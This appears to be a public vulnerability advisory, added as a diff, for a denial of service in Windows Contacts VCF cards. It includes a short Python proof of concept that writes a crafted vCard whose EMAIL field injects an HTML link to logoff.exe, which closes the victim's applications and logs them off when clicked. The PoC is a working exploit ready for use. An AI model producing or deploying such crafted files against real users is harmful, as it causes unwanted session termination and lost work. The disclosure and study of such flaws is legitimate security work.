@@ -1,0 +1,93 @@
+# Exploit Title: Microsoft Outlook VCF cards - Denial of Service (PoC)
+# Date: 2020-01-04
+# Exploit Author: hyp3rlinx
+# Vendor Homepage: www.microsoft.com
+
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-VCF-MAILTO-LINK-DENIAL-OF-SERVICE.txt
+[+] twitter.com/hyp3rlinx
+[+] ISR: ApparitionSec     
+ 
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+A VCF file is a standard file format for storing contact information for a person or business.
+Microsoft Outlook supports the vCard and vCalendar features.
+These are a powerful new approach to electronic Personal Data Interchange (PDI).
+
+
+[Vulnerability Type]
+Mailto Link Denial Of Service
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+Windows VCF cards do not properly sanitize email addresses allowing for HTML injection.
+A corrupt VCF card can cause all the users currently opened files and applications to be closed
+and their session to be terminated without requiring any accompanying attacker supplied code. 
+
+This can be done by crafting the Mailto link to point to Windows "logoff.exe". The corrupt VCF card can then
+kill all users applications and also log the target off their computer, if the VCF card is opened in
+using Windows Contacts and the link is clicked.
+
+The logoff.exe executable lives in "C:\Windows\System32" and can terminate applications and log out users without requiring args.
+
+This probably will affect Windows 7 the most as Windows 10 can possibly default opening VCF files in other programs
+like (People). However, users can possibly still choose to open the VCF in Contacts by right-click the file.
+
+Note, this exploit requires user interaction.
+
+[Exploit/POC]
+"VCF_DoS.py"
+
+dirty_vcf=(
+'BEGIN:VCARD\n'
+'VERSION:4.0\n'
+'FN:Session Terminate PoC - ApparitionSec\n'
+'EMAIL:<a href="logoff">DoS@microsoft.com</a>\n'
+'END:VCARD')
+
+f=open("DoS.vcf", "w")
+f.write(dirty_vcf)
+f.close()
+
+print "VCF Denial Of Service card created!"
+print "By hyp3rlinx"
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=P4OGN7pZLSg
+
+
+[Network Access]
+Local
+
+
+[Severity]
+Medium
+
+
+[Disclosure Timeline]
+Vendor Notification: January 2, 2020
+MSRC : "In order to investigate your report I will need an explanation on how an attacker could use the information
+        to exploit another user remotely without the use of social engineering... As such, this thread is being closed"
+      : January 3, 2020
+January 4, 2020 : Public Disclosure
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
